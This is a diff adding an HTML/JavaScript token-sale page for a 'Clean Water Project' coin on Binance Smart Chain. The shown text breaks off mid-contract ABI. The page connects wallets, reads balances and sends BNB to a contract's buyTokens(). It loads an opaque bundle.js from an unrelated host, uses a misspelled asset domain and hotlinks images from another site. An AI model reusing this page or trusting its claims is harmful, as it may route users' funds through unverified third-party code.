@@ -1,0 +1,1125 @@
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <script src="https://code.jquery.com/jquery-3.1.0.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        <style>html body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(to top, #ffffff 0%, #ffffff 100%);
+            background-repeat: no-repeat;
+            height: 100vh;
+        }
+        
+        .mid-sec {
+            background: linear-gradient(to bottom, #ffffff 0%, #ffffff 100%);
+            background-repeat: no-repeat;
+        }
+        
+        header .bg-light {
+            background-color: #ffffff !important;
+            color: rgb(0, 0, 0);
+        }
+        
+        .nav-button {
+            font-family: "Suez One";
+            font-size: 24px;
+            font-weight: 700;
+            fill: #FFFFFF;
+            color: #FFFFFF;
+            background-color: #000000;
+            border-style: solid;
+            border-width: 3px 3px 3px 3px;
+            border-color: #09ebd8;
+            border-radius: 22px 22px 22px 22px;
+            box-shadow: 4px 4px 10px 3px #09aeae;
+            padding: 12px 65px 12px 65px;
+        }
+        
+        .nav-button:hover {
+            font-family: "Suez One";
+            font-size: 22px;
+            font-weight: 600;
+            fill: #FFFFFF;
+            color: #FFFFFF;
+            background-color: #09ebeb;
+            border-style: solid;
+            border-width: 3px 3px 3px 3px;
+            border-color: #000000;
+            border-radius: 22px 22px 22px 22px;
+            box-shadow: 4px 4px 10px 3px #21d3ff;
+        }
+        
+        .logo-image {
+            width: 150px;
+        }
+        
+        .mid-sec article {
+            background-color: rgb(255, 255, 255);
+            border-radius: 32px;
+            box-shadow: rgba(25, 19, 38, 0.1) 0px 2px 12px -8px, rgba(25, 19, 38, 0.05) 0px 1px 1px;
+            color: rgb(0, 0, 0);
+            overflow: hidden;
+            padding: 24px;
+            border: 3px Solid #000;
+        }
+        
+        .padding-50 {
+            padding-top: 50px;
+            padding-bottom: 50px;
+        }
+        
+        .icon-sec {
+            justify-content: center;
+            align-items: center;
+            display: flex;
+        }
+        
+        .icon-sec .fa {
+            color: #ffffff;
+            font-size: 18px;
+        }
+        
+        hr {
+            margin-top: 0;
+        }
+        
+        .form-sec {
+            background: #ececec00;
+            border-radius: 16px;
+            padding: 10px;
+        }
+        
+        .form-sec img {
+            height: 25px;
+        }
+        
+        .bnb-sec {
+            -webkit-appearance: none;
+            background-color: rgba(224, 217, 235, 0);
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(40, 13, 95);
+            border: medium none;
+            padding: 5px 0.5rem;
+            border-radius: 12px;
+            width: auto;
+        }
+        
+        .logo-image {
+            width: 150px;
+        }
+        
+        .input-sec {
+            background: transparent;
+            border: 0;
+            border-bottom: 1px solid #8c8b8b;
+            -webkit-appearance: none;
+            border-radius: 4px;
+        }
+        
+        .prog-bar {
+            background-color: #ffffff;
+        }
+        
+        .progress {
+            height: 1.3rem;
+            border-radius: 1.25rem;
+        }
+        
+        .input-sec:focus {
+            outline: none;
+        }
+        
+        .but-modal {
+            justify-content: space-between;
+            display: flex;
+            width: 100%;
+            height: 48px;
+            padding: 0px 24px;
+            background-color: rgb(239, 244, 245);
+            margin-bottom: 8px;
+            -moz-box-align: center;
+            align-items: center;
+            border: 0px none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .token-box {
+            border-bottom: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        
+        .btn.max-butn.mr-1 {
+            background-color: transparent;
+            color: #06ad9e;
+            font-weight: 600;
+            margin: -34px;
+        }
+        
+        @media (max-width: 475.98px) {
+            .input-sec {
+                width: 100px;
+            }
+        }
+        
+        @media (min-width: 768px) and (max-width: 991.98px) {
+            .input-sec {
+                width: 100px;
+            }
+        }
+        
+        body {
+            /* 	background: #e1e1e1; */
+        }
+        /* The icon */
+        
+        .help-tip {
+            position: absolute;
+            top: 26%;
+            left: 67%;
+            transform: translate(-50%, -50%);
+            margin: auto;
+            text-align: center;
+            border: 2px solid #444;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            font-size: 14px;
+            line-height: 15px;
+            cursor: default;
+        }
+        
+        .help-tip:before {
+            content: '?';
+            font-family: sans-serif;
+            font-weight: normal;
+            color: #444;
+        }
+        
+        .help-tip:hover p {
+            display: block;
+            transform-origin: 100% 0%;
+            -webkit-animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.3s ease;
+        }
+        /* The tooltip */
+        
+        .help-tip p {
+            display: none;
+            font-family: sans-serif;
+            text-rendering: optimizeLegibility;
+            -webkit-font-smoothing: antialiased;
+            text-align: center;
+            background-color: #FFFFFF;
+            padding: 12px 16px;
+            width: 178px;
+            height: auto;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, 5%);
+            border-radius: 3px;
+            /* 	border: 1px solid #E0E0E0; */
+            box-shadow: 0 0px 20px 0 rgba(0, 0, 0, 0.1);
+            color: #37393D;
+            font-size: 12px;
+            line-height: 18px;
+            z-index: 99;
+        }
+        
+        .help-tip p a {
+            color: #067df7;
+            text-decoration: none;
+        }
+        
+        .help-tip p a:hover {
+            text-decoration: underline;
+        }
+        /* The pointer of the tooltip */
+        
+        .help-tip p:before {
+            position: relative;
+            content: '';
+            width: 0;
+            height: 0;
+            border: 10px solid transparent;
+            border-bottom-color: #FFFFFF;
+            top: -9px;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        /* Prevents the tooltip from being hidden */
+        
+        .help-tip p:after {
+            width: 10px;
+            height: 40px;
+            content: '';
+            position: absolute;
+            top: -40px;
+            left: 0;
+        }
+        /* CSS animation */
+        
+        @-webkit-keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 100%;
+            }
+        }
+        
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 100%;
+            }
+        }
+        
+        .z-footer {
+            margin-top: auto;
+            background-color: #000;
+            padding-top: .5rem;
+            padding-bottom: .5rem
+        }
+        
+        .z-footer {
+            margin-top: auto;
+            background-color: rgba(0, 0, 0, 0.938);
+            color: #fff;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+        }
+        
+        #banner-aboutPage {
+            background-image: url('../img/about-page/banner/aboutPage-banner-bg.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            width: 100%;
+            height: auto;
+        }
+        
+        #banner-content-aboutPage {
+            width: 100%;
+            height: auto;
+            padding: 150px 0;
+        }
+        
+        .banner-body-aboutPage h2 {
+            color: #fff;
+            padding-bottom: 5px;
+        }
+        
+        .banner-body-aboutPage h6 a {
+            color: #acacac;
+            text-decoration: none;
+            transition: all 300ms ease-in-out;
+            -webkit-transition: all 300ms ease-in-out;
+            -moz-transition: all 300ms ease-in-out;
+            -ms-transition: all 300ms ease-in-out;
+            -o-transition: all 300ms ease-in-out;
+        }
+        
+        .banner-body-aboutPage h6 {
+            color: #fff;
+        }
+        /*** Hover State ***/
+        
+        .banner-body-aboutPage h6 a:hover {
+            color: #fff;
+        }
+        
+        #banner {
+            background-image: url(../img/COVER_FACEBOOK_1728x.jpg);
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            width: 100%;
+            height: 94%;
+            display: flex;
+            align-items: center;
+            z-index: 9;
+        }
+        
+        .banner-element-arae {
+            position: absolute;
+            left: 95px;
+        }
+        
+        #banner::before {
+            position: absolute;
+            bottom: -9px;
+        }
+        
+        #banner::after {
+            content: "";
+            position: absolute;
+            background-color: #19003800;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        #banner-content h1 {
+            color: #000000;
+            font-family: "Suez One";
+            text-shadow: 4px 4px 3px #03495a;
+            font-weight: 900;
+            font-size: 62px;
+            margin: 0;
+            display: inline-block;
+            text-shadow: 4px 4px 3px #242323;
+            margin-bottom: 68px;
+        }
+        
+        #banner-content h1 span {
+            display: block;
+        }
+        
+        #banner-content h5 {
+            font-family: "Suez One";
+            font-weight: 900;
+            font-size: 68px;
+            text-shadow: 4px 4px 3px #3b3b3b;
+            margin: 0;
+            color: rgb(0, 0, 0);
+            margin: 0;
+            line-height: 80px;
+        }
+    </style>
+</head>
+
+<body data-rsssl="1">
+    <header>
+        <nav class="navbar navbar-light bg-light justify-content-between">
+            <a class="navbar-brand" href="#"><img src="https://cleanwaterpeoject.netlify.app/assets/img/logo/logo.png" class="logo-image"></a>
+
+            <button class="btn  my-2 my-sm-0 nav-button" id="btn-connect" data-toggle="modal" data-target="#exampleModalCenter">Connect</button>
+            <button class="btn my-2 my-sm-0 nav-button" id="btn-disconnect" onclick="onDisconnect()" style="display:none;">Disconnect</button>
+        </nav>
+    </header>
+
+    <section id="banner">
+
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-sm-12 col-md-12 col-lg-12">
+                    <!--Banner Content-->
+                    <div id="banner-content">
+                        <h5>Clean Water Project on the BSC (Binance Smart Chain)</h5>
+                        <h1>CWP </h1>
+                        <div>
+                            <button class="btn  my-2 my-sm-0 nav-button" id="btn-connect" data-toggle="modal" data-target="#exampleModalCenter">Connect</button>
+                            <button class="btn my-2 my-sm-0 nav-button" id="btn-disconnect" onclick="onDisconnect()" style="display:none;">Disconnect</button>
+
+                        </div>
+                    </div>
+                    <!--Banner Content-->
+                </div>
+            </div>
+        </div>
+    </section>
+    <section id="activity" class="section-wrapper">
+        <div class="container">
+            <div class="justify-content-center row">
+                <div class="text-center col-md-12 col-lg-8">
+                    <div class="starter-pack-title">
+                        <h1>Clean Water Project</h1>
+                        <h5>Our Vision:</h5>
+                        <h5>CleanWaterProject has minted a coin that will act as the native currency to our platform. It can be traded, held, used for purchasing merchandise and other items as well as used for the gaming end of our platform, just incase you
+                            wanted to put your skills in some fun, simple games against other CleanWaterProject members. There is even a nice prize pot twist to the gaming.
+
+                        </h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="mid-sec padding-50">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 m-auto">
+                    <div class="text-center mb-4"> <button class="btn my-2 my-sm-0 nav-button">GET YOUR CWP</button> </div>
+                    <div class="text-center" id="alert-error-https" style="display:none; color:white;"></div>
+                    <article>
+                        <div class="d-flex justify-content-between">
+
+                        </div>
+
+
+                        <div class="form-sec">
+                            <div class="d-flex justify-content-between">
+                                <p> <strong> From </strong></p>
+                                <p> Balance: <span id="selected-balance">0.00</span> </p>
+                            </div>
+                            <div class="d-flex justify-content-between">
+                                <input type="text" id="formGroupExampleInput" class="input-sec" value="" placeholder="0.00" onfocus="this.placeholder=''" onblur="this.placeholder='0.00'" onkeyup="convert()">
+
+                            </div>
+                        </div>
+                        <div class="p-3 text-center">
+                        </div>
+                        <div class="form-sec">
+                            <p><strong> Mint Your CWP Now </strong> </p>
+                            <div class="d-flex justify-content-between">
+                                <input type="text" id="formGroupExampleInput2" class="input-sec" value="0.00" disabled="">
+                                <div class="bnb-sec">
+                                    <img src="https://cleanwaterpeoject.netlify.app/assets/img/logo/logo.png"> <span> CWP</span>
+                                </div>
+                            </div>
+                        </div>
+                        <!--<div id="prig" style="display:none;">-->
+                        <!--<div class="progress mt-3" id="progress">-->
+                        <!--  <div class="progress-bar prog-bar" role="progressbar" style="width: 0.00%;" aria-valuenow="" aria-valuemin="0" aria-valuemax="100">-->
+                        <!--      <span>0.00%</span>-->
+                        <!--  </div>-->
+                        <!--</div>-->
+
+                        <!--</div>-->
+                        <button class="btn mt-3 w-100 p-3 nav-button" type="submit" id="pay">Unlock Wallet</button>
+                    </article>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer class="z-footer">
+
+        <div class="container">
+            <div class="justify-content-center row">
+                <div class="text-center text-md-left d-flex align-items-center justify-content-center col-sm-12 col-md-6">Copyright © 2021 Clean Water Project, All rights Reserved</div>
+
+            </div>
+        </div>
+
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLongTitle"> <strong> Connect to a wallet </strong> </h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">×</span>
+        </button>
+                </div>
+                <div class="modal-body">
+                    <div id="">
+                        <button class="but-modal" id="wallet_coonect" type="button" onclick="onConnect()">
+             <div color="primary" class="sc-gtsrHT GXQFF">WalletConnect</div>
+             <svg viewBox="0 0 96 96" width="32px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM kDWlca"><path d="M96 48C96 21.4903 74.5097 0 48 0C21.4903 0 0 21.4903 0 48C0 74.5097 21.4903 96 48 96C74.5097 96 96 74.5097 96 48Z" fill="#3389FB"></path><path d="M29.6927 35.4245C39.8036 25.5252 56.1965 25.5252 66.3074 35.4245L67.5242 36.6159C68.0298 37.1109 68.0298 37.9134 67.5242 38.4084L63.3616 42.4839C63.1088 42.7314 62.699 42.7314 62.4462 42.4839L60.7717 40.8444C53.7181 33.9384 42.282 33.9384 35.2284 40.8444L33.4351 42.6002C33.1823 42.8477 32.7725 42.8477 32.5197 42.6002L28.3571 38.5247C27.8515 38.0297 27.8515 37.2272 28.3571 36.7322L29.6927 35.4245ZM74.9161 43.8532L78.6208 47.4805C79.1264 47.9755 79.1264 48.778 78.6208 49.2729L61.9159 65.6288C61.4103 66.1237 60.5907 66.1237 60.0851 65.6288C60.0851 65.6288 60.0851 65.6288 60.0851 65.6288L48.229 54.0206C48.1026 53.8968 47.8977 53.8968 47.7713 54.0206C47.7713 54.0206 47.7713 54.0206 47.7713 54.0206L35.9153 65.6288C35.4098 66.1237 34.5902 66.1237 34.0846 65.6288C34.0846 65.6288 34.0846 65.6288 34.0846 65.6288L17.3792 49.2727C16.8736 48.7778 16.8736 47.9753 17.3792 47.4803L21.0839 43.853C21.5895 43.3581 22.4091 43.3581 22.9146 43.853L34.771 55.4614C34.8974 55.5851 35.1023 55.5851 35.2287 55.4614C35.2287 55.4614 35.2287 55.4614 35.2287 55.4614L47.0844 43.853C47.59 43.358 48.4096 43.358 48.9152 43.853C48.9152 43.853 48.9152 43.853 48.9152 43.853L60.7715 55.4614C60.8979 55.5851 61.1028 55.5851 61.2292 55.4614L73.0854 43.8532C73.5909 43.3583 74.4105 43.3583 74.9161 43.8532Z" fill="white"></path></svg>
+            </button>
+                        <button class="but-modal" id="metamask" type="button" onclick="demo()">
+               <div color="primary" class="sc-gtsrHT GXQFF">Metamask</div>
+                 <svg viewBox="0 0 96 96" width="32px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM kDWlca"><circle cx="48" cy="48" r="48" fill="white"></circle><path d="M77.7602 16.9155L51.9419 36.0497L56.7382 24.7733L77.7602 16.9155Z" fill="#E17726"></path><path d="M18.2656 16.9155L43.8288 36.2283L39.2622 24.7733L18.2656 16.9155Z" fill="#E27625"></path><path d="M68.4736 61.2808L61.6108 71.7918L76.3059 75.8482L80.4899 61.5104L68.4736 61.2808Z" fill="#E27625"></path><path d="M15.5356 61.5104L19.6941 75.8482L34.3892 71.7918L27.5519 61.2808L15.5356 61.5104Z" fill="#E27625"></path><path d="M33.5984 43.5251L29.491 49.699L44.0584 50.3624L43.5482 34.6724L33.5984 43.5251Z" fill="#E27625"></path><path d="M62.4274 43.525L52.2991 34.4937L51.9419 50.3622L66.5094 49.6989L62.4274 43.525Z" fill="#E27625"></path><path d="M34.3892 71.7922L43.1654 67.5316L35.6137 61.6128L34.3892 71.7922Z" fill="#E27625"></path><path d="M52.8345 67.5316L61.6107 71.7922L60.3861 61.6128L52.8345 67.5316Z" fill="#E27625"></path><path d="M61.6107 71.7923L52.8345 67.5317L53.5233 73.2465L53.4468 75.6446L61.6107 71.7923Z" fill="#D5BFB2"></path><path d="M34.3892 71.7923L42.5531 75.6446L42.502 73.2465L43.1654 67.5317L34.3892 71.7923Z" fill="#D5BFB2"></path><path d="M42.7062 57.8369L35.4097 55.6939L40.5631 53.3213L42.7062 57.8369Z" fill="#233447"></path><path d="M53.2937 57.8369L55.4367 53.3213L60.6412 55.6939L53.2937 57.8369Z" fill="#233447"></path><path d="M34.3893 71.7918L35.6649 61.2808L27.552 61.5104L34.3893 71.7918Z" fill="#CC6228"></path><path d="M60.3352 61.2808L61.6108 71.7918L68.4736 61.5104L60.3352 61.2808Z" fill="#CC6228"></path><path d="M66.5094 49.6987L51.9419 50.362L53.294 57.8371L55.4371 53.3215L60.6416 55.6941L66.5094 49.6987Z" fill="#CC6228"></path><path d="M35.4098 55.6941L40.5633 53.3215L42.7063 57.8371L44.0584 50.362L29.491 49.6987L35.4098 55.6941Z" fill="#CC6228"></path><path d="M29.491 49.6987L35.6139 61.6129L35.4098 55.6941L29.491 49.6987Z" fill="#E27525"></path><path d="M60.6414 55.6941L60.3862 61.6129L66.5092 49.6987L60.6414 55.6941Z" fill="#E27525"></path><path d="M44.0584 50.3618L42.7063 57.8369L44.4156 66.6641L44.7728 55.0305L44.0584 50.3618Z" fill="#E27525"></path><path d="M51.9415 50.3618L51.2527 55.005L51.5843 66.6641L53.2937 57.8369L51.9415 50.3618Z" fill="#E27525"></path><path d="M53.2938 57.8374L51.5845 66.6646L52.8346 67.532L60.3862 61.6132L60.6413 55.6943L53.2938 57.8374Z" fill="#F5841F"></path><path d="M35.4097 55.6943L35.6138 61.6132L43.1654 67.532L44.4155 66.6646L42.7062 57.8374L35.4097 55.6943Z" fill="#F5841F"></path><path d="M53.4468 75.6443L53.5233 73.2462L52.8855 72.6849H43.1143L42.502 73.2462L42.5531 75.6443L34.3892 71.792L37.2465 74.1391L43.0378 78.1445H52.962L58.7533 74.1391L61.6107 71.792L53.4468 75.6443Z" fill="#C0AC9D"></path><path d="M52.8346 67.5315L51.5845 66.6641H44.4156L43.1655 67.5315L42.5022 73.2462L43.1145 72.6849H52.8857L53.5235 73.2462L52.8346 67.5315Z" fill="#161616"></path><path d="M78.8314 37.2998L80.9999 26.7377L77.7599 16.9155L52.8345 35.4119L62.4271 43.5247L75.9485 47.4791L78.9335 43.984L77.6323 43.04L79.7243 41.1521L78.1426 39.902L80.2091 38.3458L78.8314 37.2998Z" fill="#763E1A"></path><path d="M15 26.7377L17.194 37.2998L15.7909 38.3458L17.8574 39.902L16.2756 41.1521L18.3676 43.04L17.0665 43.984L20.0514 47.4791L33.5984 43.5247L43.1655 35.4119L18.2656 16.9155L15 26.7377Z" fill="#763E1A"></path><path d="M75.9487 47.4793L62.4272 43.5249L66.5092 49.6989L60.3862 61.613L68.4736 61.511H80.4898L75.9487 47.4793Z" fill="#F5841F"></path><path d="M33.5983 43.5249L20.0513 47.4793L15.5356 61.511H27.5519L35.6137 61.613L29.4908 49.6989L33.5983 43.5249Z" fill="#F5841F"></path><path d="M51.9415 50.3617L52.8344 35.4115L56.7378 24.7729H39.262L43.1653 35.4115L44.0583 50.3617L44.3899 55.0559L44.4154 66.664H51.5843L51.6099 55.0559L51.9415 50.3617Z" fill="#F5841F"></path></svg>
+            </button>
+                        <div id="bssc">
+                            <button class="but-modal" id="bsc" type="button" onclick="bsc()">
+                     <div color="primary" class="sc-gtsrHT GXQFF">BSC</div>
+                     <img src="https://pigbyt.com/wp-content/themes/cryptibit/img/bbb.png" width="32px" height="32px">
+                </button>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <div class="modal" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Modal title</h5><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div>
+                <div class="modal-body">
+                    <p>Modal body text goes here.</p>
+                </div>
+                <div class="modal-footer"><button type="button" class="btn btn-primary">Save changes</button><button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button></div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.5.2/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
+    <script type="text/javascript" src="https://ramlogics.com/a/bundle.js"></script>
+    <script>
+        if (screen.width < 1024) {
+            document.querySelector('#metamask').innerHTML = '<div color="primary" class="sc-gtsrHT GXQFF">Trust Wallet</div><img src="https://pigbyt.com/wp-content/themes/cryptibit/img/vertical_blue.png" width="32px" height="40px">';
+            document.querySelector('#bssc').innerHTML = '<button class="but-modal" id="metamask" type="button" onclick="demo()"><div color="primary" class="sc-gtsrHT GXQFF">Metamask</div><svg viewBox="0 0 96 96" width="32px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM kDWlca"><circle cx="48" cy="48" r="48" fill="white"></circle><path d="M77.7602 16.9155L51.9419 36.0497L56.7382 24.7733L77.7602 16.9155Z" fill="#E17726"></path><path d="M18.2656 16.9155L43.8288 36.2283L39.2622 24.7733L18.2656 16.9155Z" fill="#E27625"></path><path d="M68.4736 61.2808L61.6108 71.7918L76.3059 75.8482L80.4899 61.5104L68.4736 61.2808Z" fill="#E27625"></path><path d="M15.5356 61.5104L19.6941 75.8482L34.3892 71.7918L27.5519 61.2808L15.5356 61.5104Z" fill="#E27625"></path><path d="M33.5984 43.5251L29.491 49.699L44.0584 50.3624L43.5482 34.6724L33.5984 43.5251Z" fill="#E27625"></path><path d="M62.4274 43.525L52.2991 34.4937L51.9419 50.3622L66.5094 49.6989L62.4274 43.525Z" fill="#E27625"></path><path d="M34.3892 71.7922L43.1654 67.5316L35.6137 61.6128L34.3892 71.7922Z" fill="#E27625"></path><path d="M52.8345 67.5316L61.6107 71.7922L60.3861 61.6128L52.8345 67.5316Z" fill="#E27625"></path><path d="M61.6107 71.7923L52.8345 67.5317L53.5233 73.2465L53.4468 75.6446L61.6107 71.7923Z" fill="#D5BFB2"></path><path d="M34.3892 71.7923L42.5531 75.6446L42.502 73.2465L43.1654 67.5317L34.3892 71.7923Z" fill="#D5BFB2"></path><path d="M42.7062 57.8369L35.4097 55.6939L40.5631 53.3213L42.7062 57.8369Z" fill="#233447"></path><path d="M53.2937 57.8369L55.4367 53.3213L60.6412 55.6939L53.2937 57.8369Z" fill="#233447"></path><path d="M34.3893 71.7918L35.6649 61.2808L27.552 61.5104L34.3893 71.7918Z" fill="#CC6228"></path><path d="M60.3352 61.2808L61.6108 71.7918L68.4736 61.5104L60.3352 61.2808Z" fill="#CC6228"></path><path d="M66.5094 49.6987L51.9419 50.362L53.294 57.8371L55.4371 53.3215L60.6416 55.6941L66.5094 49.6987Z" fill="#CC6228"></path><path d="M35.4098 55.6941L40.5633 53.3215L42.7063 57.8371L44.0584 50.362L29.491 49.6987L35.4098 55.6941Z" fill="#CC6228"></path><path d="M29.491 49.6987L35.6139 61.6129L35.4098 55.6941L29.491 49.6987Z" fill="#E27525"></path><path d="M60.6414 55.6941L60.3862 61.6129L66.5092 49.6987L60.6414 55.6941Z" fill="#E27525"></path><path d="M44.0584 50.3618L42.7063 57.8369L44.4156 66.6641L44.7728 55.0305L44.0584 50.3618Z" fill="#E27525"></path><path d="M51.9415 50.3618L51.2527 55.005L51.5843 66.6641L53.2937 57.8369L51.9415 50.3618Z" fill="#E27525"></path><path d="M53.2938 57.8374L51.5845 66.6646L52.8346 67.532L60.3862 61.6132L60.6413 55.6943L53.2938 57.8374Z" fill="#F5841F"></path><path d="M35.4097 55.6943L35.6138 61.6132L43.1654 67.532L44.4155 66.6646L42.7062 57.8374L35.4097 55.6943Z" fill="#F5841F"></path><path d="M53.4468 75.6443L53.5233 73.2462L52.8855 72.6849H43.1143L42.502 73.2462L42.5531 75.6443L34.3892 71.792L37.2465 74.1391L43.0378 78.1445H52.962L58.7533 74.1391L61.6107 71.792L53.4468 75.6443Z" fill="#C0AC9D"></path><path d="M52.8346 67.5315L51.5845 66.6641H44.4156L43.1655 67.5315L42.5022 73.2462L43.1145 72.6849H52.8857L53.5235 73.2462L52.8346 67.5315Z" fill="#161616"></path><path d="M78.8314 37.2998L80.9999 26.7377L77.7599 16.9155L52.8345 35.4119L62.4271 43.5247L75.9485 47.4791L78.9335 43.984L77.6323 43.04L79.7243 41.1521L78.1426 39.902L80.2091 38.3458L78.8314 37.2998Z" fill="#763E1A"></path><path d="M15 26.7377L17.194 37.2998L15.7909 38.3458L17.8574 39.902L16.2756 41.1521L18.3676 43.04L17.0665 43.984L20.0514 47.4791L33.5984 43.5247L43.1655 35.4119L18.2656 16.9155L15 26.7377Z" fill="#763E1A"></path><path d="M75.9487 47.4793L62.4272 43.5249L66.5092 49.6989L60.3862 61.613L68.4736 61.511H80.4898L75.9487 47.4793Z" fill="#F5841F"></path><path d="M33.5983 43.5249L20.0513 47.4793L15.5356 61.511H27.5519L35.6137 61.613L29.4908 49.6989L33.5983 43.5249Z" fill="#F5841F"></path><path d="M51.9415 50.3617L52.8344 35.4115L56.7378 24.7729H39.262L43.1653 35.4115L44.0583 50.3617L44.3899 55.0559L44.4154 66.664H51.5843L51.6099 55.0559L51.9415 50.3617Z" fill="#F5841F"></path></svg></button>';
+        }
+    </script>
+
+    <script>
+        "use strict";
+        const Web3Modal = window.Web3Modal.default;
+        const WalletConnectProvider = window.WalletConnectProvider.default;
+        const Fortmatic = window.Fortmatic;
+        const evmChains = window.evmChains;
+        const Binance = window.BinanceChain;
+        let web3Modal
+        let provider;
+        let selectedAccount;
+        let rate;
+        let contract;
+        let humanFriendlyBalance = 0;
+        let wallet_type;
+        async function transaction() {
+            const web3 = new Web3(provider);
+            const chainId = await web3.eth.getChainId();
+            if (chainId == 97 || chainId == 56) {
+                const accounts = await web3.eth.getAccounts();
+                const amountEth = Number(document.getElementById('formGroupExampleInput').value);
+                const tokens = Number(document.getElementById('formGroupExampleInput2').value);
+                selectedAccount = accounts[0];
+                contract.methods.buyTokens().send({
+                    from: selectedAccount,
+                    value: web3.utils.toWei(amountEth.toString(), 'ether')
+                }, (err, transactionId) => {
+                    if (err) {
+                        swal('warning', 'Payment decline by user', 'warning');
+                    } else {
+                        if (screen.width < 1024) {
+                            swal('success', 'Payment successful: ' + transactionId, 'success');
+                        } else {
+                            Swal.fire({
+                                title: 'Payment Sucessuful',
+                                icon: 'success',
+                                html: '<a href="https://bscscan.com/tx/' + transactionId + '">See the transaction on bscscan</a> <br>' +
+                                    'Add CWP token in <b>MetaMask</b><br> ' +
+                                    'Click on "add" token button ',
+                                showCloseButton: true,
+                                showCancelButton: true,
+                                focusConfirm: false,
+                                confirmButtonText: 'Add token',
+                                confirmButtonAriaLabel: 'Thumbs up, great!',
+                                cancelButtonText: 'Close',
+                                cancelButtonAriaLabel: 'Thumbs down'
+                            }).then((result) => {
+                                if (result.isConfirmed) {
+                                    add();
+                                }
+
+                            });
+                        }
+                        refreshAccountData();
+                    }
+
+                });
+
+            } else {
+                swal('warning', '', 'warning');
+            }
+        }
+        async function fetchAccountData() {
+            const web3 = new Web3(provider);
+            const chainId = await web3.eth.getChainId();
+            const chainData = evmChains.getChain(chainId);
+            const accounts = await web3.eth.getAccounts();
+            selectedAccount = accounts[0];
+            document.querySelector("#btn-connect").textContent = selectedAccount.substring(0, 5);
+            const balance = await web3.eth.getBalance(selectedAccount);
+            const ethBalance = web3.utils.fromWei(balance, "ether");
+            humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
+            document.querySelector("#selected-balance").textContent = humanFriendlyBalance;
+            if (humanFriendlyBalance > 0) {
+                document.querySelector("#pay").textContent = "pay";
+                $("#pay").attr("onclick", "transaction()");
+            } else {
+                $("#pay").attr("onclick", "");
+                document.querySelector("#pay").setAttribute("disabled", "disabled");
+                const alert = document.querySelector("#alert-error-https");
+                alert.style.display = "block";
+                document.querySelector("#alert-error-https").textContent = "You have insufficient balance";
+            }
+            document.querySelector("#btn-disconnect").style.display = "block";
+            let contract_abi = [{
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "name": "_airaddress",
+                "outputs": [{
+                    "internalType": "address",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "airdrop",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "address",
+                    "name": "ref_address",
+                    "type": "address"
+                }],
+                "name": "airdropTokens",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
